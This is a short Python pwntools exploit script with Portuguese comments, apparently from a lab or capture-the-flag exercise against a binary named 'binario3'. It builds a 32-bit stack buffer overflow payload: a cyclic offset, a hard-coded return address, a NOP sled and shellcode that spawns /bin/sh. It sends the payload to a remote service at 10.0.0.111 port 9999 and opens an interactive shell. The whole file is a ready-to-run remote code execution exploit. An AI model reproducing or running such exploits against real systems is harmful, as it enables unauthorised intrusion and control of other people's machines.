#!/usr/bin/env python3

from pwn import *

context(bits=32, arch='i386')
# Encontrar o offset correto
#eip = 0x61616174
buff = cyclic(cyclic_find('taaa'))

# Construir o buffer com o offset correto
#buff = b"A" * offset

# Endereço de retorno (EIP) ajustado
eip = p32(0xffffd080)

# NOP sled
nops = b"\x90" * 20

# Shellcode que redireciona stdin, stdout e stderr para o socket
shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
# Construir o payload final
payload = buff + eip + nops + shellcode

# Conectar ao servidor remoto
conn = remote('10.0.0.111', 9999)
#conn = process('./binario3')
# Enviar o payload
conn.sendline(payload)

# Abrir uma sessão interativa
conn.interactive()
